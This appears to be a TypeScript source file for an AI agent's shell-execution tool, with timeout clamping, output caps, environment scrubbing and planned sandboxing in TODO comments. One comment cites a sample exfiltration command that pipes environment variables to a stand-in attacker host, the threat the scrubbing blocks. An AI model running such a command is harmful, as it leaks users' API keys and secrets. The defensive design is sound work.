import { spawn } from 'child_process';
import { randomBytes } from 'crypto';
import type { ToolContext, ToolDefinition, ToolHandler, ToolResult } from './types.js';
import { TOOL_NAMES } from './types.js';
import { sanitizeEnv } from '../security/env.js';

// Static prefix for the post-run $PWD marker. A random nonce (per invocation)
// is appended so a user command echoing the literal prefix cannot be confused
// with the wrapper's marker.
const CWD_SENTINEL_PREFIX = '__FACTORY_CWD_AFTER__';

// Default per-call wall-clock cap. Long enough for most builds/tests but
// short enough that a runaway command can't hold the agent loop hostage.
// Callers can override per-call via the `timeout` parameter.
const DEFAULT_TIMEOUT_MS = 120_000;
// Hard bounds on the model-supplied timeout. Without these, a `0` would
// disable the timeout entirely (Node treats falsy as no timeout, so the
// command could block the agent loop indefinitely), and `Infinity`/huge
// values are equivalent. 1s lower bound is past any reasonable command
// startup; 10min upper bound is past any test/build we'd want to run
// inline (longer ones should use a background runner anyway).
const MIN_TIMEOUT_MS = 1_000;
const MAX_TIMEOUT_MS = 600_000;
const DEFAULT_TIMEOUT_DESCRIPTION = `Timeout in milliseconds. Default: ${DEFAULT_TIMEOUT_MS} (${DEFAULT_TIMEOUT_MS / 60_000} minutes). Clamped to [${MIN_TIMEOUT_MS}, ${MAX_TIMEOUT_MS}].`;

function clampTimeout(raw: unknown): number {
  if (raw === undefined || raw === null) return DEFAULT_TIMEOUT_MS;
  const n = typeof raw === 'number' ? raw : Number(raw);
  if (!Number.isFinite(n)) return DEFAULT_TIMEOUT_MS;
  return Math.max(MIN_TIMEOUT_MS, Math.min(n, MAX_TIMEOUT_MS));
}

// Cap on combined stdout+stderr we ship back as the tool result. Past this
// point the model can't usefully consume more, and bigger buffers grow the
// per-turn conversation cost linearly.
const OUTPUT_CAP_BYTES = 50_000;

// Combined view: stdout as-is, with any non-empty stderr fenced under a
// `--- stderr ---` separator. Empty-stderr (the common case) stays a flat
// stdout string so we don't pay token overhead for noise. Models otherwise
// confuse warnings/progress on stderr (npm, cargo, pytest) with real
// errors, and useful failure messages on stderr get buried mid-stdout.
function formatBody(stdout: string, stderr: string): string {
  if (!stderr) return stdout;
  if (!stdout) return `--- stderr ---\n${stderr}`;
  const sep = stdout.endsWith('\n') ? '--- stderr ---\n' : '\n--- stderr ---\n';
  return `${stdout}${sep}${stderr}`;
}

const definition: ToolDefinition = {
  type: 'function',
  function: {
    name: TOOL_NAMES.Bash,
    description:
      'Execute a shell command and return its output (stdout + stderr). Use for system commands, git, builds, tests, and other terminal operations.',
    parameters: {
      type: 'object',
      required: ['command'],
      properties: {
        command: {
          type: 'string',
          description: 'The shell command to execute',
        },
        timeout: {
          type: 'number',
          description: DEFAULT_TIMEOUT_DESCRIPTION,
        },
      },
    },
  },
};

async function execute(args: Record<string, unknown>, ctx?: ToolContext): Promise<ToolResult> {
  const command = typeof args.command === 'string' ? args.command : '';
  const timeout = clampTimeout(args.timeout);
  const cwd = ctx?.cwd ?? process.cwd();

  if (!command) {
    return { success: false, output: 'command is required' };
  }

  // Wrap the user command so we can capture the final $PWD without disturbing
  // the exit code. The user's command must run in the SAME shell as the
  // printf below — otherwise `cd /foo` in a subshell wouldn't be visible to
  // `$PWD`. We use a leading newline before the bookkeeping so commands that
  // don't end in a newline (or that emit incomplete lines) still get a clean
  // separator. Variable names use a `__factory_` prefix to avoid colliding
  // with anything the user's command might set. The sentinel includes a
  // per-invocation nonce so a user command that legitimately prints the
  // static prefix can't be misparsed as the wrapper's marker.
  const nonce = randomBytes(8).toString('hex');
  const sentinel = `${CWD_SENTINEL_PREFIX}${nonce}`;
  const wrapped = `${command}\n__factory_rc=$?\nprintf '\\n%s%s\\n' '${sentinel}:' "$PWD"\nexit $__factory_rc`;

  // Env scrubbing (deny-by-default; see src/security/env.ts). Cuts the
  // exfiltration surface to ~15 named vars + a few prefixes — model can
  // no longer `printenv | curl -d @- evil.com` provider API keys.
  const { env } = sanitizeEnv(process.env, ctx?.envPolicy);

  return new Promise(resolve => {
    const proc = spawn('sh', ['-c', wrapped], {
      cwd,
      env,
      timeout,
      // Pass the per-turn signal so an aborted turn kills the running
      // shell instead of leaving it to wall-clock timeout.
      signal: ctx?.signal,
    });

    let stdout = '';
    let stderr = '';
    let settled = false;
    const settle = (r: ToolResult): void => {
      if (settled) return;
      settled = true;
      resolve(r);
    };

    proc.stdout.on('data', (data: Buffer) => {
      stdout += data.toString();
    });

    proc.stderr.on('data', (data: Buffer) => {
      stderr += data.toString();
    });

    // Signal-driven termination (timeout, AbortController) is reported on
    // 'exit'. We must resolve here rather than waiting for 'close', because
    // 'close' is gated on stdio drain — and a wrapped command like
    // `sleep 30` leaves the sleep child holding stdout/stderr after sh
    // dies, so 'close' wouldn't fire until the orphan finished. Result:
    // a 1s timeout would block the agent loop for 30s.
    proc.on('exit', (_code, signal) => {
      if (!signal) return;
      const tail = formatBody(stdout, stderr);
      settle({
        success: false,
        output: tail
          ? `Command terminated by signal ${signal}\n${tail}`
          : `Command terminated by signal ${signal}`,
      });
    });

    proc.on('close', code => {
      // Strip the sentinel from stdout before showing the user/model. Look at
      // the very tail (\\n SENTINEL : path \\n?) to avoid eating earlier text
      // that might coincidentally contain the sentinel string.
      let cwdAfter: string | undefined;
      const sentinelRe = new RegExp(`\\n${sentinel}:([^\\n]*)\\n?$`);
      const m = stdout.match(sentinelRe);
      if (m) {
        cwdAfter = m[1];
        stdout = stdout.replace(sentinelRe, '');
      }

      const body = formatBody(stdout, stderr);
      const truncated =
        body.length > OUTPUT_CAP_BYTES
          ? body.slice(0, OUTPUT_CAP_BYTES) + '\n...(output truncated)'
          : body;

      let output: string;
      if (code === 0) {
        output = truncated || '(no output)';
      } else {
        output = truncated ? `(exit code ${code})\n${truncated}` : `(exit code ${code})`;
      }

      // The command ran — even a non-zero exit is informational (lint errors,
      // failing tests, grep miss). Don't treat as a tool failure; let the
      // model interpret the exit code in the output. Real tool failures only
      // come from the 'error' event below (spawn / system error).
      // Set `important` on non-zero exit so the toolPreview gate surfaces
      // the body to the user — without this, a `npm test` that exits 1
      // renders only the call line and the user can't see the failure.
      // Only surface cwdAfter when the command actually changed the dir —
      // otherwise the agent loop wastefully re-renders refreshGitState etc.
      // Note on concurrency: this assumes the agent loop runs Bash calls
      // sequentially, so a `cd` in one call is observable to the next.
      // run-tool-calls.ts enforces that contract — see the for-of in
      // runToolCalls. If that ever parallelizes, cwdAfter semantics need
      // rethinking (last-writer-wins isn't well-defined under parallelism).
      const dirChanged = cwdAfter !== undefined && cwdAfter !== cwd;
      settle({
        success: true,
        output,
        important: code !== 0,
        cwdAfter: dirChanged ? cwdAfter : undefined,
      });
    });

    proc.on('error', err => {
      settle({ success: false, output: `Failed to execute: ${err.message}` });
    });
  });
}

// TODO(security, Tier 3): OS-level sandbox for the spawned shell.
// Motivation:
//   - Tier 1+2 (pattern policy + env scrub + path policy) are pure
//     allow/deny checks. They reduce risk but don't *contain* a command
//     once it runs: an approved `npm test` can still write anywhere the
//     user can write, fork unbounded subprocesses, and reach the network.
//   - For untrusted models or untrusted repositories (cloned project that
//     has hostile package.json scripts), pattern matching alone is not
//     enough — we want to bound the command's capabilities at the OS.
// Shape:
//   - Pluggable executor abstraction. Replace `spawn('sh', …)` with
//     `executor.run(command, …)`. Default executor is the current
//     unconstrained shell. Other executors:
//       * macOS: `sandbox-exec -f <profile> sh -c "$cmd"`. Profile bind-
//         allows project dir + tmp, denies network (network-outbound),
//         denies file-read on home dot-dirs (~/.ssh, ~/.aws, ~/.factory).
//         sandbox-exec is Apple-deprecated but still ships and works
//         everywhere we run; zero install.
//       * Linux: `bwrap` (bubblewrap, rootless, what Flatpak uses).
//         `bwrap --ro-bind / / --bind <cwd> <cwd> --tmpfs /tmp
//         --unshare-net --die-with-parent --new-session sh -c "$cmd"`.
//         Fallback to `firejail` if bwrap missing.
//   - Per-command opt-in for network: a rule like {pattern: 'npm install*',
//     allowNetwork: true} re-enables network in the sandbox profile for
//     that one command. Default-deny.
//   - Selection: `--sandbox=auto|none|sandbox-exec|bwrap` flag,
//     persisted in config. `auto` picks the platform default if available,
//     warns and falls through to `none` otherwise (with a config setting
//     to make missing-sandbox a hard error instead).
// Detection:
//   - Log every sandbox profile decision so users can see which restrictions
//     fired. When a sandboxed command exits non-zero with a profile-violation
//     signature in stderr, surface "this looks like a sandbox denial — see
//     `sandbox-exec` profile" in the tool result so models don't go
//     debugging the wrong layer.

// TODO(security, Tier 4): container / microVM isolation for high-risk runs.
// Motivation:
//   - Tier 3 sandboxes share the kernel and the user's filesystem. They
//     defeat casual exfiltration but not a kernel exploit, and any tool
//     that legitimately needs broad host access (e.g. `code .`, opening a
//     browser) has to be granted broadly. For "I'm pointing an unknown
//     model at an unknown repo" runs, a stronger boundary is warranted.
// Shape:
//   - Opt-in `--sandbox=docker|lima|container` mode that runs every Bash
//     command inside an ephemeral container with the project bind-mounted
//     read-write and the rest of the host invisible.
//   - Backend options:
//       * Docker / Podman / Apple `container` for the OCI path. Image
//         picked from config (default a small ubuntu/alpine + a `dev`
//         tag). Container lives for the session, command runs via
//         `docker exec` so we don't pay startup per call.
//       * Lima (macOS) or Firecracker microVMs for stronger isolation
//         without a full Docker daemon.
//   - Network egress allowlist: container's resolver/proxy restricted to
//     a list of hosts (registry.npmjs.org, github.com, …). Ship a
//     reasonable default; let users extend.
// Tradeoffs to flag in docs:
//   - Slower startup (1–5s per session).
//   - Some tools break: anything that needs to launch a host GUI, attach
//     to host services, or read paths outside the project mount.
//   - Different OS in the container — script behaviour can differ from
//     the host (gnu vs bsd `sed`, etc.). Picking the container image is
//     part of the user's setup, not a hidden default.
// Detection:
//   - Fail loudly if the user requested `--sandbox=docker` but the daemon
//     isn't running, rather than silently falling through to a less
//     restricted backend.

export const bashTool: ToolHandler = {
  name: TOOL_NAMES.Bash,
  description: definition.function.description,
  category: 'execute',
  definition,
  execute,
};

// Exported for tests.
export const __testing = { clampTimeout, MIN_TIMEOUT_MS, MAX_TIMEOUT_MS, DEFAULT_TIMEOUT_MS };
